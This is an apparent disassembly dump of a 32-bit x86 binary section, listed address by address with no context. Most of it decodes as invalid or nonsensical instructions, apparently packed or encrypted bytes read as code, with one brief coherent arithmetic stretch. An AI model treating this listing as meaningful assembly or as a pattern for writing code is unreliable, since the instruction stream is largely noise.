  415d2e:	imul   esi,DWORD PTR [ecx],0xffffff85
  415d31:	bound  ecx,QWORD PTR [ecx-0x76]
  415d34:	jle    0x415d29
  415d36:	and    edx,DWORD PTR [edi]
  415d38:	mov    cl,0x89
  415d3a:	stc    
  415d3b:	test   esp,ecx
  415d3d:	pop    edi
  415d3e:	sub    eax,0x5a4463b7
  415d43:	stos   BYTE PTR es:[edi],al
  415d44:	xor    al,0x3
  415d46:	cmp    ecx,DWORD PTR [ecx+0x26]
  415d49:	(bad)  [ecx]
  415d4b:	add    eax,0x98f293c0
  415d50:	dec    ecx
  415d51:	cli    
  415d52:	mov    ah,0x15
  415d54:	sub    BYTE PTR [ecx-0x7f384b32],cl
  415d5a:	jbe    0x415d38
  415d5c:	pop    es
  415d5d:	pusha  
  415d5e:	jno    0x415d01
  415d60:	jnp    0x415d49
  415d62:	cmp    eax,DWORD PTR cs:[eax+edx*1-0x59]
  415d67:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415d68:	mov    edi,esp
  415d6a:	sti    
  415d6b:	fidivr DWORD PTR [ebx+0x3d4c17fa]
  415d71:	push   edx
  415d72:	enter  0x2f10,0x6d
  415d76:	mov    esp,0x65fc37e5
  415d7b:	stos   BYTE PTR es:[edi],al
  415d7c:	xchg   ebx,eax
  415d7d:	inc    esi
  415d7e:	dec    ebx
  415d7f:	jo     0x415dee
  415d81:	test   BYTE PTR [edi],0xe8
  415d84:	adc    al,0x4
  415d86:	xchg   esi,eax
  415d87:	rol    bh,1
  415d89:	and    al,0x44
  415d8b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415d8c:	push   esi
  415d8d:	pop    edx
  415d8e:	ret    
  415d8f:	mov    ch,0x32
  415d91:	loop   0x415dba
  415d93:	mov    ebp,0xd363e78b
  415d98:	hlt    
  415d99:	jmp    0x415d4e
  415d9b:	mov    ebx,ebp
  415d9d:	adc    DWORD PTR [ebp-0x5c68ff5f],esi
  415da3:	arpl   si,ax
  415da5:	cli    
  415da6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415da7:	sti    
  415da8:	pop    ecx
  415da9:	adc    ch,BYTE PTR [esi-0x497a67da]
  415daf:	pop    esp
  415db0:	pop    eax
  415db1:	test   al,0x23
  415db3:	push   esi
  415db4:	mov    esp,0x1eb9ab73
  415db9:	arpl   di,ax
  415dbb:	addr16 jg 0x415d74
  415dbe:	ret    0xc4bb
  415dc1:	test   eax,0x6a7967f2
  415dc6:	mov    edi,cs
  415dc8:	xlat   BYTE PTR ds:[ebx]
  415dc9:	dec    ecx
  415dca:	bound  esp,QWORD PTR [edi]
  415dcc:	inc    esi
  415dcd:	call   0x9e5:0x976c05e7
  415dd4:	jge    0x415de5
  415dd6:	jnp    0x415dab
  415dd8:	xchg   ecx,eax
  415dd9:	ret    0xccbe
  415ddc:	mov    DWORD PTR [eax+0x1e],eax
  415ddf:	or     bl,BYTE PTR [ebx]
  415de1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415de2:	add    ch,BYTE PTR [ebp+0x37e42666]
  415de8:	mov    ch,0x8a
  415dea:	jmp    0x1261f4da
  415def:	stos   BYTE PTR es:[edi],al
  415df0:	stos   BYTE PTR es:[edi],al
  415df1:	mov    esi,0x1c506597
  415df6:	stc    
  415df7:	mov    esp,0xa18f8102
  415dfc:	mov    ebp,0x747f260c
  415e01:	xchg   BYTE PTR [ebp-0x1c25a2e7],bh
  415e07:	fucom  st(6)
  415e09:	unpckhps xmm2,XMMWORD PTR [ebx-0xc53ae5c]
  415e10:	das    
  415e11:	rcl    BYTE PTR [ecx-0x5b],1
  415e14:	xchg   esi,eax
  415e15:	out    0x1e,eax
  415e17:	jp     0x415db1
  415e19:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415e1a:	aam    0x9d
  415e1c:	call   0x3332:0x36d1b621
  415e23:	ror    ah,0x63
  415e26:	les    edi,FWORD PTR [edi]
  415e28:	push   0xa6df8e31
  415e2d:	(bad)  
  415e2f:	pop    edx
  415e30:	ins    DWORD PTR es:[edi],dx
  415e31:	scas   eax,DWORD PTR es:[edi]
  415e32:	pavgw  mm3,mm5
  415e35:	popa   
  415e36:	or     BYTE PTR [edi+0x63],dh
  415e39:	and    dh,BYTE PTR [ebp+0x51008b21]
  415e3f:	mov    ah,BYTE PTR [ecx]
  415e41:	(bad)  
  415e43:	imul   esi,DWORD PTR [edi+0x52ceb83],0xffffffb6
  415e4a:	xor    dl,BYTE PTR [eax+0x508687fa]
  415e50:	mov    WORD PTR [ecx+0x6e],?
  415e53:	pop    ebx
  415e54:	fcomp  DWORD PTR ds:0xe0dd877e
  415e5a:	rcr    DWORD PTR [ecx],cl
  415e5c:	aam    0xbc
  415e5e:	mov    edx,cs
  415e60:	xchg   ebx,eax
  415e61:	nop
  415e62:	mov    bh,0xc4
  415e64:	ss in  eax,0xd2
  415e67:	cmp    al,0xf3
  415e69:	cld    
  415e6a:	imul   edi,DWORD PTR [eax+0x64427877],0x44
  415e71:	xchg   ebx,eax
  415e72:	pop    edi
  415e73:	xchg   BYTE PTR [ebx],dl
  415e75:	mov    ah,BYTE PTR [edi]
  415e77:	jle    0x415e88
  415e79:	dec    ebx
  415e7a:	mov    edi,0xbf6d5faa
  415e7f:	ret    
  415e80:	jle    0x415e29
  415e82:	rol    DWORD PTR [ebx+0x4b504dc3],1
  415e88:	push   edx
  415e89:	cmp    al,0x1a
  415e8b:	jmp    0x1422bdcf
  415e90:	sbb    al,0x51
  415e92:	call   0xd43d:0xaa21ed0e
  415e99:	icebp  
  415e9a:	popa   
  415e9b:	mov    bh,0xa2
  415e9d:	xchg   edi,eax
  415e9e:	push   es
  415e9f:	(bad)  
  415ea0:	into   
  415ea1:	xchg   edi,ecx
  415ea3:	inc    ecx
  415ea4:	adc    al,0xf4
  415ea6:	mov    esp,0x524d5ab6
  415eab:	rol    DWORD PTR [edx-0x1fb840d6],cl
  415eb1:	pop    esp
  415eb2:	mov    fs,ecx
  415eb4:	inc    edi
  415eb5:	sti    
  415eb6:	jo     0x415f2b
  415eb8:	cmp    eax,0xc0f8cb55
  415ebd:	jno    0x415ede
  415ebf:	adc    bl,BYTE PTR gs:[ebx]
  415ec2:	pop    ebx
  415ec3:	rcl    ch,1
  415ec5:	mov    ah,0xbb
  415ec7:	or     dl,BYTE PTR [ebx+ebp*1]
  415eca:	add    ebp,esp
  415ecc:	jge    0x415ea0
  415ece:	aam    0xf3
  415ed0:	rcl    DWORD PTR [eax],1
  415ed2:	push   es
  415ed3:	mov    esi,0xa036ea4f
  415ed8:	push   edi
  415ed9:	adc    al,0xfc
  415edb:	mov    bl,0xec
  415edd:	shr    ebx,1
  415edf:	inc    esi
  415ee0:	ret    
  415ee1:	fmul   st,st(3)
  415ee3:	inc    ebp
  415ee4:	adc    ch,bh
  415ee6:	push   es
  415ee7:	into   
  415ee8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415ee9:	mov    ch,0x1b
  415eeb:	test   eax,0xfc0a2402
  415ef0:	xchg   edi,eax
  415ef1:	pop    esi
  415ef2:	jo     0x415e9a
  415ef4:	out    dx,eax
  415ef5:	(bad)  
  415ef6:	xchg   ecx,eax
  415ef7:	sbb    al,0xe9
  415ef9:	icebp  
  415efa:	adc    eax,0xf6d6bb5
  415eff:	jmp    0x74c970ee
  415f04:	mov    ecx,0x57ca2dfd
  415f09:	fmul   QWORD PTR [edx+0x236eef5b]
  415f0f:	scas   eax,DWORD PTR es:[edi]
  415f10:	dec    ebp
  415f11:	sub    bh,BYTE PTR [esi-0x56f653e2]
  415f17:	jo     0x415f24
  415f19:	add    ebp,ebp
  415f1b:	and    BYTE PTR [edx-0x50],dl
  415f1e:	jl     0x415eac
  415f20:	mov    dh,0x84
  415f22:	data16 (bad) 
  415f24:	and    eax,DWORD PTR [eax+0x67c65ed2]
  415f2a:	cmp    al,0x2d
  415f2c:	lods   eax,DWORD PTR ds:[esi]
  415f2d:	hlt    
  415f2e:	mov    al,0xf6
  415f30:	jno    0x415f5c
  415f32:	mov    cl,0xdb
  415f34:	(bad)
  415f37:	nop
  415f38:	imul   ebx,DWORD PTR [ebp-0x1a],0x6f37fdc2
  415f3f:	xchg   edi,eax
  415f40:	lds    ebp,FWORD PTR [eax-0x4a]
  415f43:	xchg   DWORD PTR [eax-0x2a],esi
  415f46:	nop
  415f47:	fnstenv [esi-0x3ac3dcf7]
  415f4d:	and    eax,0x1006a690
  415f52:	xchg   ebx,eax
  415f53:	push   esp
  415f54:	dec    ecx
  415f55:	push   0xffffff90
  415f57:	push   0xffffff8d
  415f59:	test   al,0x17
  415f5b:	mov    ecx,0x68ae06c7
  415f60:	xchg   ebp,eax
  415f61:	sahf   
  415f62:	mov    ds,WORD PTR [ebx-0x46]
  415f65:	jecxz  0x415eef
  415f67:	ins    DWORD PTR es:[edi],dx
  415f68:	div    BYTE PTR [eax]
  415f6a:	mov    DWORD PTR [ebp-0x3],0x5f0aa550
  415f71:	test   BYTE PTR [esi+0x76],dh
  415f74:	xor    bl,0xe
  415f77:	sub    edi,DWORD PTR ds:0x3b3894e4
  415f7d:	push   eax
  415f7e:	sbb    edi,edx
  415f80:	dec    eax
  415f81:	dec    eax
  415f82:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415f83:	pop    ebp
  415f84:	mov    DWORD PTR [esi-0x9],edx
  415f87:	add    DWORD PTR [esi-0x56],esi
  415f8a:	pop    edx
  415f8b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415f8c:	stos   BYTE PTR es:[edi],al
  415f8d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415f8e:	mov    al,0x7
  415f90:	aaa    
  415f91:	mov    eax,ds:0x9505c31a
  415f96:	mov    ch,0xc2
  415f98:	pop    es
  415f99:	pop    ebx
  415f9a:	dec    esp
  415f9b:	add    eax,0xb578e1d1
  415fa0:	fild   WORD PTR [ebp+esi*2+0x5a678687]
  415fa7:	inc    ebx
  415fa8:	call   0x2cb290a6
  415fad:	jns    0x416006
  415faf:	xor    DWORD PTR [edx],esp
  415fb1:	mov    eax,0xdc17ebfd
  415fb6:	pop    ebp
  415fb7:	arpl   WORD PTR [edi-0x66],bp
  415fba:	xor    eax,0x5db6473a
  415fbf:	sahf   
  415fc0:	dec    DWORD PTR [eax]
  415fc2:	fdivr  st,st(0)
  415fc4:	pop    ss
  415fc5:	std    
  415fc6:	xchg   edx,eax
  415fc7:	loope  0x415fb9
  415fc9:	push   cs
  415fca:	cli    
  415fcb:	aad    0xc0
  415fcd:	xchg   edx,eax
  415fce:	sbb    DWORD PTR [esi],edi
  415fd0:	xchg   ebx,eax
  415fd1:	pop    esi
  415fd2:	popf   
  415fd3:	xlat   BYTE PTR ds:[ebx]
  415fd4:	retf   0xc1d9
  415fd7:	jge    0x415ff2
  415fd9:	rcl    DWORD PTR [eax-0x71],0x4
  415fdd:	call   0xd5266529
  415fe2:	xor    esi,DWORD PTR [edi-0x7ba2bd48]
  415fe8:	sbb    al,0x24
  415fea:	mov    BYTE PTR [eax+ebp*2+0x1112382f],cl
  415ff1:	adc    al,0x9c
  415ff3:	push   esi
  415ff4:	jmp    0x9890:0x9bdfd5b9
  415ffb:	add    sp,WORD PTR [edi+0x293a2142]
  416002:	nop
  416003:	sub    DWORD PTR [eax],esp
  416005:	xor    edx,ebx
  416007:	mov    DWORD PTR [ebp-0x50],edx
  41600a:	mov    edx,DWORD PTR [ebp+0x8]
  41600d:	mov    ebx,DWORD PTR [ebp-0x4c]
  416010:	add    edx,edi
  416012:	and    edx,ebx
  416014:	mov    DWORD PTR [ebp-0x4c],edx
  416017:	mov    edx,DWORD PTR [ebp+0x8]
  41601a:	mov    ebx,DWORD PTR [ebp-0x48]
  41601d:	lea    edx,[ebx+edx*1+0x241fc1f]
  416024:	mov    DWORD PTR [ebp-0x48],edx
  416027:	mov    edx,DWORD PTR [ebp+0x8]
  41602a:	mov    ebx,0xfa5e15e2
  41602f:	sub    ebx,edx
  416031:	add    ebx,DWORD PTR [ebp-0x44]
  416034:	mov    DWORD PTR [ebp-0x44],ebx
  416037:	mov    edx,DWORD PTR [ebp+0x8]
  41603a:	xor    edx,eax
  41603c:	add    edx,esi
  41603e:	jmp    0x418387
  416043:	inc    ebp
  416044:	mov    edx,eax
  416046:	ss xchg edx,eax
  416048:	test   ebx,0x7652fd8b
  41604e:	and    eax,0x5bb81ff5
  416053:	clc    
  416054:	push   ebp
  416055:	jge    0x4160d3
  416057:	inc    eax
  416058:	pop    edi
  416059:	jl     0x4160d7
  41605b:	xchg   bh,cl
  41605d:	xlat   BYTE PTR ds:[ebx]
  41605e:	xor    eax,0xb51d691f
  416063:	add    al,0x60
  416065:	stos   DWORD PTR es:[edi],eax
  416066:	and    esi,ebp
  416068:	adc    bl,BYTE PTR [edi]
  41606a:	cmp    al,0xed
  41606c:	push   ebp
  41606d:	cmp    al,0x2f
  41606f:	repz or al,0x0
  416072:	(bad)  
  416073:	js     0x4160a5
  416075:	and    DWORD PTR [eax+0xd],0x2673de8a
  41607c:	loope  0x41609d
  41607e:	clc    
  41607f:	loopne 0x41604b
  416081:	imul   BYTE PTR [ebp+0x67]
  416084:	push   0x24044c1f
  416089:	inc    edi
  41608a:	xor    al,0xa5
  41608c:	(bad)  
  41608d:	shl    DWORD PTR [ecx+0x6a],1
  416090:	jnp    0x41602a
  416092:	fwait
  416093:	int    0xac
  416095:	in     al,dx
  416096:	or     DWORD PTR ds:0xef7a5e78,eax
  41609c:	scas   al,BYTE PTR es:[edi]
  41609d:	ret    0x17d1
  4160a0:	loop   0x4160bd
  4160a2:	retf   0x2e47
  4160a5:	and    al,0x88
  4160a7:	jae    0x4160f8
  4160a9:	push   edi
  4160aa:	xchg   BYTE PTR [esp+ecx*1-0x4e],dl
  4160ae:	popa   
  4160af:	push   esi
  4160b0:	and    BYTE PTR [ecx+0x514ace90],ah
  4160b6:	aas    
  4160b7:	arpl   WORD PTR [eax],dx
  4160b9:	out    dx,al
  4160ba:	or     eax,0xf9a4c050
  4160bf:	arpl   WORD PTR [ebx-0x3dfa1f39],ax
  4160c5:	jnp    0x41605d
  4160c7:	ss sahf 
  4160c9:	dec    edx
  4160ca:	dec    edx
  4160cb:	rol    BYTE PTR ds:[ebp-0x51],0x1d
  4160d0:	xchg   ecx,eax
  4160d1:	cmp    eax,0xb5408eef
  4160d6:	pop    edi
  4160d7:	and    BYTE PTR [ecx-0x30da3d53],dl
  4160dd:	loop   0x416127
  4160df:	outs   dx,DWORD PTR ds:[esi]
  4160e0:	sub    edi,DWORD PTR [ecx-0x11]
  4160e3:	imul   eax,DWORD PTR ds:0x5cc76be9,0x68e0f742
  4160ed:	add    ah,BYTE PTR [edx-0x62]
  4160f0:	xor    BYTE PTR [ebp-0xf],0x9c
  4160f4:	(bad)  
  4160f5:	jg     0x4160e9
  4160f7:	push   ds
  4160f8:	mov    DWORD PTR [ebx-0x13ffe6eb],edx
  4160fe:	aaa    
  4160ff:	mov    edi,0x3f81933
  416104:	adc    al,dl
  416106:	scas   al,BYTE PTR es:[edi]
  416107:	icebp  
  416108:	cmp    DWORD PTR [edi-0x1e],ebx
  41610b:	call   0x959d0c27
  416110:	es in  al,dx
  416112:	out    dx,eax
  416113:	arpl   WORD PTR [edx],si
  416115:	add    cl,BYTE PTR [ecx+0x23912318]
  41611b:	clc    
  41611c:	inc    edi
  41611d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41611e:	jnp    0x416124
  416120:	cmc    
  416121:	in     al,dx
  416122:	pop    ebp
  416123:	push   0xf71bf1e8
  416128:	add    eax,0x992a9244
  41612d:	inc    ebx
  41612e:	ins    BYTE PTR es:[edi],dx
  41612f:	rcr    BYTE PTR [ebp-0x1f],0x1d
  416133:	mov    esi,0x6b87faf1
  416138:	loopne 0x4161a9
  41613a:	fsub   DWORD PTR [ebp-0x5c]
  41613d:	mov    eax,0x1d954756
  416142:	loopne 0x41619f
  416144:	daa    
  416145:	int3   
  416146:	push   ecx
  416147:	xchg   edx,eax
  416148:	adc    ecx,0x54
  41614b:	mov    al,0x8a
  41614d:	inc    ebp
  41614e:	dec    ebx
  41614f:	stos   BYTE PTR es:[edi],al
  416150:	or     DWORD PTR [eax+0x59],ebx
  416153:	push   ss
  416154:	shl    DWORD PTR [ebp+0x47],0x5d
  416158:	out    0xc8,eax
  41615a:	jg     0x416183
  41615c:	pop    esi
  41615d:	mov    al,ds:0xccf0cd51
  416162:	sub    ebx,edi
  416164:	retf   
  416165:	fucomi st,st(4)
  416167:	aam    0xb0
  416169:	push   cs
  41616a:	push   ebx
  41616b:	mov    bh,0x23
  41616d:	shl    DWORD PTR [eax-0x6e],0xd1
  416171:	inc    edi
  416172:	mov    ebp,0xb06e76e5
  416177:	pop    eax
  416178:	sub    DWORD PTR [ebx],ecx
  41617a:	pop    DWORD PTR [ecx-0x9]
  41617d:	dec    ebp
  41617e:	mov    ?,WORD PTR [edx-0x7613f265]
  416184:	es mov ebp,0x51a80650
  41618a:	(bad)  
  41618c:	or     BYTE PTR [eiz*4-0x233691c9],dh
  416193:	out    dx,eax
  416194:	loop   0x4161c3
  416196:	retf   0xf204
  416199:	retf   0x4642
  41619c:	push   ebx
  41619d:	mov    esp,ds
  41619f:	or     eax,0x85dd7d40
  4161a4:	mov    edx,0x4be8d18
  4161a9:	(bad)  
  4161aa:	jg     0x4161cc
  4161ac:	add    BYTE PTR [eax],bh
  4161ae:	(bad)  
  4161af:	cmp    eax,0xe7627c43
  4161b4:	jmp    0x4161f3
  4161b6:	mov    al,0x66
  4161b8:	mov    ch,0x4f
  4161ba:	inc    ebp
  4161bb:	ss js  0x4161e7
  4161be:	in     al,dx
  4161bf:	stc    
  4161c0:	out    0x15,al
  4161c2:	dec    esp
  4161c3:	out    0xa7,al
  4161c5:	dec    ebx
  4161c6:	arpl   WORD PTR [ebp-0x416af09b],di
  4161cc:	pop    ebx
  4161cd:	inc    esi
  4161ce:	lods   al,BYTE PTR ds:[esi]
  4161cf:	and    DWORD PTR [edx-0x1a],0x2b
  4161d3:	push   edi
  4161d4:	dec    esp
  4161d5:	std    
  4161d6:	xlat   BYTE PTR ds:[ebx]
  4161d7:	pop    ebx
  4161d8:	add    eax,0x8e996f01
  4161dd:	pusha  
  4161de:	mov    esi,0xf80f255e
  4161e3:	inc    edx
  4161e4:	nop
  4161e5:	lods   eax,DWORD PTR ds:[esi]
  4161e6:	sub    eax,0x22b51d7f
  4161eb:	and    ebp,DWORD PTR [eax+0x67bdac8b]
  4161f1:	div    BYTE PTR [ebx-0x68]
  4161f4:	cmp    esi,ecx
  4161f6:	sub    DWORD PTR [esp+eiz*4-0x3],0x19e19b6b
  4161fe:	out    0x5d,eax
  416200:	mov    bh,0xcd
  416202:	(bad)  
  416203:	cli    
  416204:	lea    edx,[eax+0x29]
  416207:	add    DWORD PTR [esi-0x74027427],ebp
  41620d:	ins    BYTE PTR es:[edi],dx
  41620e:	push   ebp
  41620f:	xchg   esp,eax
  416210:	push   edi
  416211:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416212:	add    DWORD PTR [ecx+0x6c035ab],ebp
  416218:	(bad)  
  416219:	int3   
  41621a:	test   DWORD PTR [ecx],eax
  41621c:	dec    esi
  41621d:	jnp    0x416266
  41621f:	xchg   edx,eax
  416220:	and    eax,esi
  416222:	sbb    al,BYTE PTR [ebx+0x2a]
  416225:	(bad)  
  416226:	dec    ebp
  416227:	retf   0x1a25
  41622a:	xor    edi,esi
  41622c:	shl    DWORD PTR [edi+0x1f],cl
  41622f:	das    
  416230:	test   esp,0x84271077
  416236:	adc    BYTE PTR [ebp-0x5e46870a],dh
  41623c:	out    dx,al
  41623d:	in     al,dx
  41623e:	in     eax,dx
  41623f:	das    
  416240:	pop    ecx
  416241:	test   DWORD PTR [esi+0x77],0x45484cca
  416248:	jl     0x4161f0
  41624a:	and    al,0x32
  41624c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41624d:	mov    ds:0x562d138c,al
  416252:	inc    ecx
  416253:	cmp    al,0xad
  416255:	(bad)  
  416256:	popa   
  416257:	xchg   ebx,eax
  416258:	push   0x95008f7d
  41625d:	sub    dh,cl
  41625f:	pushf  
  416260:	test   eax,0xa03b89b8
  416265:	jl     0x416256
  416267:	or     eax,0x92769852
  41626c:	xlat   BYTE PTR ds:[ebx]
  41626d:	add    BYTE PTR [edx],bl
  41626f:	inc    esi
  416270:	test   BYTE PTR [edi+0x41],dl
  416273:	out    0x0,eax
  416275:	adc    eax,0xf7439469
  41627a:	jle    0x416299
  41627c:	cmp    esi,DWORD PTR [edi+0x6f]
  41627f:	adc    bh,BYTE PTR [edx+0x68]
  416282:	inc    eax
  416283:	push   ebp
  416284:	aam    0x6c
  416286:	aad    0x42
  416288:	js     0x41628f
  41628a:	retf   0x1876
  41628d:	pop    eax
  41628e:	ficom  WORD PTR cs:[edx+esi*8-0x5c9446d7]
  416296:	ret    0xc744
  416299:	xor    eax,0xade0e56a
  41629e:	xchg   ebp,eax
  41629f:	push   edx
  4162a0:	cld    
  4162a1:	push   ecx
  4162a2:	mov    ?,WORD PTR [eax-0x58]
  4162a5:	push   eax
  4162a6:	pop    edi
  4162a7:	popa   
  4162a8:	or     dl,BYTE PTR [ebx]
  4162aa:	adc    DWORD PTR [esi],ebx
  4162ac:	pop    edx
  4162ad:	pushf  
  4162ae:	xchg   esi,eax
  4162af:	pop    es
  4162b0:	cmp    dh,BYTE PTR [esi+0x46]
  4162b3:	sbb    dh,BYTE PTR [ebx+0x7c]
  4162b6:	xchg   esp,eax
  4162b7:	fst    DWORD PTR [edx-0x1c]
  4162ba:	mov    ch,0xb6
  4162bc:	jmp    0xc6e105f1
  4162c1:	lods   al,BYTE PTR ds:[esi]
  4162c2:	iret   
  4162c3:	adc    al,0x43
  4162c5:	mov    BYTE PTR [ebp-0x5c],ah
  4162c8:	or     eax,ecx
  4162ca:	mov    esp,0x4c6e6f46
  4162cf:	push   cs
  4162d0:	out    0x59,al
  4162d2:	lea    edi,ds:0xf5664624
  4162d8:	push   esi
  4162d9:	or     bl,BYTE PTR [eax+ecx*8-0x4]
  4162dd:	dec    ebp
  4162de:	inc    edi
  4162df:	enter  0xde1e,0xb3
  4162e3:	enter  0xba6c,0x99
  4162e7:	(bad)  
  4162e8:	jo     0x416350
  4162ea:	jge    0x4162ec
  4162ec:	out    0xea,eax
  4162ee:	sti    
  4162ef:	mov    ds:0x4b86a43c,eax
  4162f4:	xor    eax,0x4bd7f928
  4162f9:	frstor [ecx+0x722cd32]
  4162ff:	mov    esi,0x25f3f76f
  416304:	xchg   esp,eax
  416305:	adc    edi,DWORD PTR [eax+eiz*4]
  416308:	jo     0x4162c6
  41630a:	mov    WORD PTR [ecx],fs
  41630c:	xlat   BYTE PTR ds:[ebx]
  41630d:	cs dec eax
  41630f:	retf   
  416310:	jae    0x4162a4
  416312:	push   ebx
  416313:	add    eax,0xdcb839a7
  416318:	xor    eax,0x989b634f
  41631d:	jecxz  0x4162a0
  41631f:	push   eax
  416320:	or     edi,DWORD PTR [esi+0x5d]
  416323:	pop    ebx
  416324:	ret    0x718b
  416327:	stos   DWORD PTR es:[edi],eax
  416328:	add    ah,BYTE PTR [ebx-0x67]
  41632b:	out    0xea,eax
  41632d:	mov    ah,0x63
  41632f:	daa    
  416330:	inc    ebp
  416331:	and    BYTE PTR [esi+0x64d0ddb3],dl
  416337:	xor    al,0x68
  416339:	or     DWORD PTR [edi-0x6237613],ebp
  41633f:	add    al,0x45
  416341:	frstor [esi]
  416343:	ins    DWORD PTR es:[edi],dx
  416344:	and    BYTE PTR [esi],ah
  416346:	lock inc esi
  416348:	test   BYTE PTR [edi],ch
  41634a:	in     al,0x7f
  41634c:	sbb    BYTE PTR [esi+0x3d5fb57b],dl
  416352:	and    BYTE PTR [edi],dh
  416354:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416355:	sbb    edx,esi
  416357:	test   esi,ebp
  416359:	mov    eax,0xd3202da8
  41635e:	mov    esp,0xf46029d5
  416363:	das    
  416364:	jp     0x4163bf
  416366:	cmp    eax,0x6d16cab9
  41636b:	fs xchg esp,eax
  41636d:	inc    esi
  41636e:	test   al,dl
  416370:	leave  
  416371:	fsub   DWORD PTR [edx+0x44]
  416374:	outs   dx,DWORD PTR ds:[esi]
  416375:	mov    ?,WORD PTR [edx+esi*1-0x3c]
  416379:	or     eax,0xaa9b816f
  41637e:	ror    BYTE PTR [si+0x2d],1
  416382:	enter  0x60f5,0x89
  416386:	test   al,0xa7
  416388:	push   esi
  416389:	push   edx
  41638a:	in     al,dx
  41638b:	mov    DWORD PTR fs:[esi],0xc0741c25
  416392:	pop    ebp
  416393:	jge    0x416337
  416395:	jno    0x4163cd
  416397:	xor    edx,ecx
  416399:	sbb    DWORD PTR [edx+0x21f7f60e],edx
  41639f:	push   es
  4163a0:	pusha  
  4163a1:	scas   eax,DWORD PTR es:[edi]
  4163a2:	nop
  4163a3:	inc    esi
  4163a4:	rol    edi,cl
  4163a6:	mov    bl,0xc
  4163a8:	pusha  
  4163a9:	add    dl,BYTE PTR [edx]
  4163ab:	push   0x348150fa
  4163b0:	add    ah,bl
  4163b2:	mov    ah,0x21
  4163b4:	es mov bl,0xb4
  4163b7:	push   eax
  4163b8:	fisubr DWORD PTR [edi+0x8]
  4163bb:	mov    eax,ds:0x5ef31f93
  4163c0:	iret   
  4163c1:	fs push esi
  4163c3:	cdq    
  4163c4:	xor    edx,DWORD PTR [edx]
  4163c6:	add    DWORD PTR [edx-0x75],0xab8c0c69
  4163cd:	std    
  4163ce:	mul    DWORD PTR [edx]
  4163d0:	mov    ah,0x1d
  4163d2:	sub    bl,dl
  4163d4:	les    edx,FWORD PTR [ebx+eax*1]
  4163d7:	into   
  4163d8:	repnz mov ds:0x6c4fd8ae,eax
  4163de:	mov    bl,0x5
  4163e0:	iret   
  4163e1:	out    0x2a,eax
  4163e3:	jecxz  0x416405
  4163e5:	popa   
  4163e6:	cmp    esi,DWORD PTR [edi+0x294207f6]
  4163ec:	pop    edx
  4163ed:	lods   eax,DWORD PTR ds:[esi]
  4163ee:	fild   QWORD PTR [ebp-0x6a134fcc]
  4163f5:	sub    eax,0xa2f9ff92
  4163fa:	fbstp  TBYTE PTR [edi]
  4163fc:	mov    ds:0x2e08c754,eax
  416401:	or     al,0x6a
  416403:	xor    BYTE PTR [esi+0x6c31a923],bh
  416409:	sbb    ebx,DWORD PTR [ebp+0x54f63205]
  41640f:	in     al,dx
  416410:	sub    al,0xfe
  416412:	fisttp QWORD PTR [edi+0x59]
  416415:	and    al,0x0
  416417:	(bad)  [ebx*4+0x79d6d204]
  41641e:	adc    ebp,DWORD PTR [edi+0x4d]
  416421:	jb     0x4163aa
  416423:	es std 
  416425:	or     DWORD PTR [ecx+0x7e],ebx
  416428:	loopne 0x416445
  41642a:	sbb    al,0xc2
  41642c:	inc    eax
  41642d:	cdq    
  41642e:	dec    esi
  41642f:	out    dx,al
  416430:	mov    ebp,0xf49ceb2d
  416435:	mov    al,0x5c
  416437:	test   DWORD PTR [eax+0x3463a88e],esi
  41643d:	ficomp WORD PTR [ebx-0xc]
  416440:	cmp    dl,BYTE PTR [ecx+0x7a161a8a]
  416446:	cmp    edx,DWORD PTR [edx+eax*4-0x32]
  41644a:	jle    0x4164a2
  41644c:	imul   ebp,esp,0x66
  41644f:	sbb    BYTE PTR [edi],bh
  416451:	cmp    eax,0x2820e49f
  416456:	int3   
  416457:	loop   0x416475
  416459:	mov    ah,BYTE PTR [eax+0x3eef9523]
  41645f:	jge    0x4163f6
  416461:	pop    edi
  416462:	mov    esi,0x5b88164f
  416467:	pop    esp
  416468:	ficom  DWORD PTR ds:0x35ac1ea8
  41646e:	xchg   ebx,eax
  41646f:	fs fs push cs
  416472:	mov    ah,0x21
  416474:	rol    DWORD PTR [esi],cl
  416476:	mov    esi,0x34247dcc
  41647b:	lock test BYTE PTR [ebp+0x499fafad],ch
  416482:	push   ss
  416483:	or     bl,0x97
  416486:	(bad)  
  416488:	mov    dl,0x64
  41648a:	fadd   QWORD PTR [edx]
  41648c:	cld    
  41648d:	pop    edi
  41648e:	jb     0x416435
  416490:	or     BYTE PTR [ebx+0x3e],ch
  416493:	add    al,BYTE PTR [edi+0x1b1d1c37]
  416499:	in     al,dx
  41649a:	dec    ebp
  41649b:	xchg   edx,eax
  41649c:	(bad)  
  41649d:	push   cs
  41649e:	mov    ecx,0x34cd1ea3
  4164a3:	xchg   ecx,eax
  4164a4:	cmc    
  4164a5:	push   esi
  4164a6:	mov    ch,0xba
  4164a8:	je     0x4164b5
  4164aa:	leave  
  4164ab:	or     esp,ebx
  4164ad:	dec    edi
  4164ae:	in     eax,dx
  4164af:	pusha  
  4164b0:	frstor [ebx+0x5c]
  4164b3:	inc    eax
  4164b4:	sbb    DWORD PTR [edx-0x76669738],esp
  4164ba:	imul   ecx,esp,0xffffffe5
  4164bd:	enter  0xd4a7,0x55
  4164c1:	in     eax,0xf6
  4164c3:	(bad)  
  4164c4:	jl     0x41652b
  4164c6:	ret    0x9fd9
  4164c9:	sbb    al,0xff
  4164cb:	push   ds
  4164cc:	mov    esi,0xfcc2f00
  4164d1:	cmp    eax,0x66e2f4f2
  4164d6:	sbb    ch,BYTE PTR [esi]
  4164d8:	xchg   DWORD PTR [ecx],edi
  4164da:	clc    
  4164db:	pop    esi
  4164dc:	add    DWORD PTR [edi+0x2b4061ec],ebx
  4164e2:	cld    
  4164e3:	retf   
  4164e4:	les    esp,FWORD PTR [edx]
  4164e6:	jno    0x4164a6
  4164e8:	push   ecx
